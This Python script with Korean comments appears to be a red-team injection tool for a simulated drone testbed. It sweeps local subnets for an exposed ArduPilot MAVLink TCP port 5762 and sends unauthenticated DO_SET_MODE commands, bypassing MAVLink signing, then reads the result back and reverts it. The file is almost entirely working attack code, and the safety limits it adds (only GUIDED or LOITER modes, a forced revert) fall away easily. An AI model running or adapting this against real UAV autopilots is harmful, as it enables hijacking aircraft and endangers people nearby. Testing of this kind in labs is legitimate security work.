#!/usr/bin/env python3
"""serial5762 — 노출된 SITL 시리얼(tcp:<uav>:5762) 직결 DO_SET_MODE (INJECT · A계층).

R4 정찰이 발견한 0.0.0.0:5762 노출 표면(H1)을 이용해 attacker_ue 에서 자동조종에 직접
DO_SET_MODE 를 발행한다. ARIA(14555)·MAVLink 서명 계층을 관통(직접 시리얼 → signing 무관).

★ 안전(적대검증 반영):
  · **비행안전 모드만**(GUIDED=4·LOITER=5). STABILIZE(0)/LAND(9)/disarm 절대 미발행.
  · **baseline 선관측 필수** — HEARTBEAT 로 현재 custom_mode 를 못 읽으면 **주입하지 않음**
    (가역 보장 불가 시 미주입). HEARTBEAT 는 자동조종(sysid,comp)으로 소스 고정.
  · **revert 를 finally 로 보장** — 주입이 나갔으면 예외 여부와 무관하게 baseline 으로 복원.

공격자-가시 오라클(grep0·감독 없음): 동일 5762 로 readback → accepted/effect 자기판정.
동적 IP: argv 로 endpoint 를 받되, 없으면 UE풀을 스윕해 sysid=1∧quad UAV 를 자가발견(하드코딩0).

출력(stdout, INJECT 계약 · 정확히 1줄):
  {"accepted": bool, "signed": null, "blocked_by": <str|null>, "effect": {"mode": "<int>"}}
로그·진단은 stderr(stdout 오염 금지).
"""
from __future__ import annotations

import ipaddress
import json
import socket
import subprocess
import sys
import time

FLIGHT_SAFE = (4, 5)   # 비행안전 자율모드만 주입 허용
UAV_PORT = 5762
_EMITTED = False


def log(*a: object) -> None:
    print("[serial5762]", *a, file=sys.stderr, flush=True)


def emit(accepted: bool, blocked_by: object, mode: object = None) -> None:
    global _EMITTED
    if _EMITTED:
        return
    _EMITTED = True
    out = {
        "accepted": bool(accepted),
        "signed": None,  # 직접 시리얼 — 서명계층 무관
        "blocked_by": blocked_by,
        "effect": ({"mode": str(mode)} if (accepted and mode is not None) else {}),
    }
    sys.stdout.write(json.dumps(out) + "\n")
    sys.stdout.flush()


def parse_args(argv):
    toks = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    mode, rest, i = None, [], 0
    while i < len(toks):
        if toks[i] == "mode" and i + 1 < len(toks):
            try:
                mode = int(toks[i + 1])
            except ValueError:
                mode = None
            i += 2
            continue
        rest.append(toks[i]); i += 1
    return (rest[0] if rest else None), mode


def _connected_subnets():
    out = subprocess.run(["ip", "-o", "-4", "route", "show", "scope", "link"],
                         capture_output=True, text=True, timeout=5).stdout
    nets = []
    for ln in out.splitlines():
        t = ln.split()
        if t and "/" in t[0]:
            try:
                nets.append(ipaddress.ip_network(t[0], strict=False))
            except ValueError:
                pass
    return nets


def discover_uav():
    """UE풀 스윕(:5762)->HEARTBEAT sysid=1∧quad UAV 자가발견(하드코딩0). 실패 None."""
    from pymavlink import mavutil
    for net in _connected_subnets():
        for ip in list(net.hosts())[:32]:
            s = socket.socket(); s.settimeout(1.0)
            try:
                s.connect((str(ip), UAV_PORT)); s.close()
            except Exception:
                continue
            try:
                m = mavutil.mavlink_connection(f"tcp:{ip}:{UAV_PORT}")
                hb = m.wait_heartbeat(timeout=6); m.close()
                if hb and hb.get_srcSystem() == 1 and int(hb.type) == 2:
                    return f"tcp:{ip}:{UAV_PORT}"
            except Exception:
                pass
    return None


def conn_str(ep):
    if not ep:
        return None
    s = ep if ep.split(":", 1)[0] in ("tcp", "udp", "udpin", "udpout") else "tcp:" + ep
    sch, rest = s.split(":", 1)
    if ":" not in rest:
        rest += f":{UAV_PORT}"
    return sch + ":" + rest


def read_mode(m, sysid, timeout):
    """자동조종(comp==1, sysid 고정) HEARTBEAT.custom_mode 관측. 없으면 None."""
    end = time.time() + timeout
    while time.time() < end:
        msg = m.recv_match(type="HEARTBEAT", blocking=True, timeout=1.0)
        if msg is None:
            continue
        if msg.get_srcComponent() == 1 and (sysid is None or msg.get_srcSystem() == sysid):
            return int(msg.custom_mode), msg.get_srcSystem()
    return None, sysid


def send_mode(m, mode):
    from pymavlink import mavutil
    for _ in range(5):
        m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                             mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        time.sleep(0.05)
    m.mav.command_long_send(m.target_system or 1, m.target_component or 1,
                            mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                            mode, 0, 0, 0, 0, 0)


def main() -> int:
    endpoint, mode = parse_args(sys.argv)
    if mode is None or mode not in FLIGHT_SAFE:
        log(f"mode={mode} 비행안전 아님(허용 {FLIGHT_SAFE}) — 주입 거부")
        emit(False, "no_effect")
        return 0
    try:
        from pymavlink import mavutil
    except Exception as e:
        log("pymavlink import 실패:", type(e).__name__); emit(False, "no_effect"); return 1

    conn = conn_str(endpoint) or discover_uav()
    if conn is None:
        log("UAV 5762 표면 미발견"); emit(False, "no_effect"); return 1

    m = None
    injected = False
    baseline = None
    sysid = None
    try:
        log(f"5762 직결 {conn} (키·서명 없음)")
        m = mavutil.mavlink_connection(conn, source_system=255, source_component=190)
        if m.wait_heartbeat(timeout=12) is None:
            log("HEARTBEAT 미수신"); emit(False, "no_effect"); return 1
        baseline, sysid = read_mode(m, None, 6.0)
        if baseline is None:
            log("baseline custom_mode 미관측 — 가역 보장 불가 → 주입하지 않음")
            emit(False, "no_effect"); return 0
        log(f"baseline custom_mode={baseline} sysid={sysid}")

        injected = True
        log(f"DO_SET_MODE custom_mode={mode} 주입(서명 우회)")
        send_mode(m, mode)

        observed = baseline
        end = time.time() + 8
        while time.time() < end:
            cur, sysid = read_mode(m, sysid, 1.5)
            if cur is not None:
                observed = cur
                if cur == mode:
                    break
        accepted = observed == mode
        log(f"readback custom_mode={observed} accepted={accepted}")
        emit(accepted, None if accepted else "no_effect", mode if accepted else None)
        return 0
    except Exception as e:
        log("예외:", type(e).__name__, str(e)); emit(False, "no_effect"); return 1
    finally:
        # 가역 보장: 주입했고 baseline 이 비행안전이면 예외 여부와 무관하게 복원.
        try:
            if m is not None and injected and baseline in FLIGHT_SAFE and baseline != mode:
                log(f"복원 → baseline custom_mode={baseline}")
                send_mode(m, baseline)
                r, _ = read_mode(m, sysid, 8.0)
                log(f"복원 readback custom_mode={r}")
        except Exception as e:
            log("복원 중 예외(무시):", type(e).__name__)
        if m is not None:
            try:
                m.close()
            except Exception:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
